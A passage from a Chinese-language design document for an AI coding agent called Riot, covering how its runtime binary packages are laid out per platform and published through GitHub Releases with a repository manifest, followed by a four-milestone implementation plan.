所以包里分两个目录:`bin/` 是全套,通过 `RUNTIME_BIN_DIR` 暴露,要用哪个就显式写全路径;`path/` 只有别处不提供、不会遮住任何东西的那几个(`pdftoppm` 一类),只有它会被拼进 PATH。skill 正文里因此统一写 `"$RUNTIME_BIN_DIR/python3"` 而不是 `python3`。

LibreOffice 连 `path/` 都不进:Windows 上它自己的目录里躺着一个 `python.exe`,而 `soffice.exe` 要靠同目录的 DLL 才能起来 —— 想让它上 PATH 就只能把整个目录塞进去。改成由渲染脚本从 `RUNTIME_BIN_DIR` 解析绝对路径,这个两难就不存在了(Windows 按 exe 所在目录搜 DLL,不需要 PATH 配合)。

### 15.4 平台差异

包按平台分别制作 —— 原生绑定是按平台编译的,没法交叉产出。两边的实质差异只有一处:Windows 上 `CreateProcess` 不认无扩展名的脚本,所以 Python 侧不能走 shim,包里额外放一份名字到真实 `.exe` 的映射清单。模型敲的命令仍然走 shim,因为 Riot 在 Windows 上用的是 Git for Windows 的 bash。

### 15.5 怎么发出去

包托管在单独的仓库 [`caiwuu/riot-pkg`](https://github.com/caiwuu/riot-pkg),布局是 `<包名>/<平台>/`。包名在平台上层:那个仓库以后不止装文档一个能力,按平台分在最外面的话,一个包的东西会散在各平台目录里。

`[约束]` **包体走 Releases,不进 git。**GitHub 拒收超过 100MB 的单个文件,而一个包压缩后两百多 MB。Git LFS 的免费额度(1GB 存储 + 1GB/月流量)对这个量级也撑不了几次下载。仓库里只留清单。

清单反过来读**仓库文件**而不是 release 资产:改清单的场合多半是下线某个坏掉的版本或换个下载地址,那种时候不该被迫再发一版。

发布分两段,顺序不能反 —— Riot 一读到新清单就会拿里面的 url 去下载,资产得先在那儿:

1. 各平台机器上跑构建脚本,产物落到 `<包名>/<平台>/`,同时写一份只描述本平台的 `packs.json`;
2. 任一台机器上跑 `scripts/doc-pack/publish.mjs`,把各平台清单并成根目录那份、比对每个包的 sha256、传资产、最后推清单。

`[约束]` **合并时字段冲突要报错,不能挑一个。**两台构建机写出的版本号对不上,意味着它们跑的不是同一批;挑哪边都会让另一个平台的用户装到版本号名不副实的包,而症状要到运行时才出现。

---

## 附:实施顺序

**M1 — 内核能自己改自己的代码**

protocol 类型 + 主循环 + Read/Write/Edit/Bash/Glob/Grep 六个工具 + 权限三态 + 取消体系 + 不变量断言。此时没有 UI,用集成测试驱动。

**M2 — 桌面端跑起来**

Tauri 宿主 + bridge + 会话 UI + 流式渲染 + 权限弹窗 + diff 审阅。内核仍以 library 形式内嵌。

**M3 — 长任务能力**

上下文压缩 + 会话持久化与 resume + 队列消息 + 错误恢复全路径 + prompt caching。

**M4 — 拆进程与扩展**

内核独立二进制 + MCP 接入 + Explore 子 agent + 内嵌终端 + git 集成。
